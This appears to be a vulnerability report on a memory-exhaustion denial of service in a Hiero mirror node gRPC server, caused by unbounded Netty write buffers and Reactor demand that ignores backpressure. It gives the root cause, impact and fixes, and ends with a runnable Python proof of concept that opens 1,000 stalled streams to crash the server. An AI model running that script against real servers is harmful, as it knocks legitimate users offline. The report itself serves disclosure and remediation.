### Title
Unbounded Netty Write Buffer Accumulation via Slow/Non-Consuming gRPC Client (Memory Exhaustion DoS)

### Summary
`grpcServerConfigurer()` configures no write buffer high-watermark, no write timeout, and no connection limit on the `NettyServerBuilder`. Combined with `ConsensusController.subscribeTopic()` using an unbounded-demand Reactor `.subscribe()` that calls `responseObserver::onNext` without ever checking `ServerCallStreamObserver.isReady()`, a client that opens a subscription and then stops reading can cause the server's Netty `ChannelOutboundBuffer` to grow without bound, exhausting JVM heap. No privilege is required.

### Finding Description

**Code locations:**

- `grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35
- `grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java`, `subscribeTopic()`, lines 43–53

**Root cause — two cooperating gaps:**

1. **No write-side flow-control in `grpcServerConfigurer()`.**
   The builder receives only two settings:
   ```java
   serverBuilder.executor(applicationTaskExecutor);
   serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection()); // = 5
   ```
   Nothing sets `writeBufferHighWaterMark`, `writeBufferLowWaterMark`, a per-stream or per-connection write timeout, `maxConnectionAge`, or `maxConnectionIdle`. Netty's `ChannelOutboundBuffer` therefore has no enforced ceiling.

2. **Unbounded-demand Reactor subscription in `ConsensusController`.**
   ```java
   .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);
   ```
   Reactor's `LambdaSubscriber` issues `Long.MAX_VALUE` demand to the upstream `Flux`. `responseObserver::onNext` is a non-blocking call that serializes the protobuf message and hands it to Netty's write queue — it never checks `ServerCallStreamObserver.isReady()` and never signals backpressure upstream.

**Exploit flow:**

When the client stops reading its TCP socket, the kernel receive buffer fills, TCP flow control halts the server's sender, the HTTP/2 flow-control window drains to zero, and gRPC-Netty can no longer flush frames. However, the Reactor pipeline continues producing `TopicMessage` objects at full speed (driven by the database poller or Redis listener), `responseObserver::onNext` continues serializing and enqueuing them into Netty's `ChannelOutboundBuffer`, and that buffer grows without bound.

**Why the existing `onBackpressureBuffer` does not help:**

`SharedTopicListener.listen()` applies:
```java
.onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
```
`maxBufferSize` defaults to 16 384. This buffer is between the shared upstream and the per-subscriber downstream. Because the downstream subscriber has `Long.MAX_VALUE` demand and `responseObserver::onNext` returns immediately (it only enqueues into Netty — it does not block), the Reactor pipeline sees zero downstream pressure. Items are "consumed" by Reactor the instant they are handed to Netty. The Reactor buffer never fills; the overflow guard never fires. The actual accumulation is invisible to Reactor — it lives entirely inside Netty's `ChannelOutboundBuffer`.

`PollingTopicListener` (used when `listenerProperties.type = POLL`) has no `onBackpressureBuffer` at all, making the situation worse for that configuration.

### Impact Explanation

Each stalled stream accumulates serialized `ConsensusTopicResponse` protobuf frames in heap memory. With `maxConcurrentCallsPerConnection = 5` and no limit on the number of connections, an attacker opens *N* connections × 5 streams each, all subscribed to a high-traffic topic, and stops reading. The server's heap fills with pending write buffers. When heap is exhausted the JVM throws `OutOfMemoryError`, crashing the gRPC service and denying service to all legitimate subscribers. Because the gRPC port is publicly accessible and no authentication is required to call `subscribeTopic`, this is a complete, unauthenticated availability attack.

### Likelihood Explanation

The preconditions are minimal: network access to the gRPC port and knowledge of any valid topic ID (or willingness to try). The attack is trivially scriptable with any gRPC client library: open a connection, call `subscribeTopic` with no `consensusEndTime` and no `limit`, then never read from the stream. The attack is repeatable and can be amplified linearly by opening more connections. No exploit tooling beyond a standard gRPC client is needed.

### Recommendation

1. **Enforce a write-buffer high-watermark and write timeout in `grpcServerConfigurer()`:**
   ```java
   serverBuilder.writeBufferHighWaterMark(64 * 1024);
   serverBuilder.writeBufferLowWaterMark(32 * 1024);
   // or use NettyServerBuilder channel option:
   serverBuilder.withChildOption(ChannelOption.WRITE_BUFFER_WATER_MARK,
       new WriteBufferWaterMark(32 * 1024, 64 * 1024));
   ```
   Add `maxConnectionIdle` and `maxConnectionAge` to reclaim stalled connections:
   ```java
   serverBuilder.maxConnectionIdle(30, TimeUnit.SECONDS);
   serverBuilder.maxConnectionAge(300, TimeUnit.SECONDS);
   ```

2. **Respect `ServerCallStreamObserver.isReady()` in `ConsensusController.subscribeTopic()`** by replacing the plain `.subscribe()` with a loop that checks `isReady()` before each `onNext`, or by using a `ServerCallStreamObserver.setOnReadyHandler` to drive demand from the Reactor publisher rather than issuing `Long.MAX_VALUE` demand unconditionally.

3. **Add a per-connection limit** via `serverBuilder.maxInboundConcurrentCallsPerConnection` or an external rate-limiter/firewall rule to cap the number of simultaneous connections per source IP.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2, timestamp_pb2

def open_stalled_stream(channel, topic_num):
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    request = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=topic_num),
        # no consensusEndTime → infinite stream
        # no limit → infinite stream
    )
    # Obtain the iterator but never call next() on it
    iterator = stub.subscribeTopic(request)
    # Block forever without consuming — stalls the server write buffer
    threading.Event().wait()

TARGET = "grpc-mirror-node:5600"  # public gRPC port, no auth required
TOPIC  = 1234                      # any valid topic with active traffic

channels = []
threads  = []
for _ in range(200):               # 200 connections × 5 streams = 1000 stalled streams
    ch = grpc.insecure_channel(TARGET)
    channels.append(ch)
    for _ in range(5):
        t = threading.Thread(target=open_stalled_stream, args=(ch, TOPIC), daemon=True)
        t.start()
        threads.append(t)

# Server heap fills with pending Netty write buffers → OOM / service crash
input("Attack running. Press Enter to stop.")
```

**Expected result:** Server JVM heap climbs continuously; GC overhead increases; eventually `OutOfMemoryError` is thrown or the process is killed by the container OOM killer, dropping all active legitimate subscriptions.
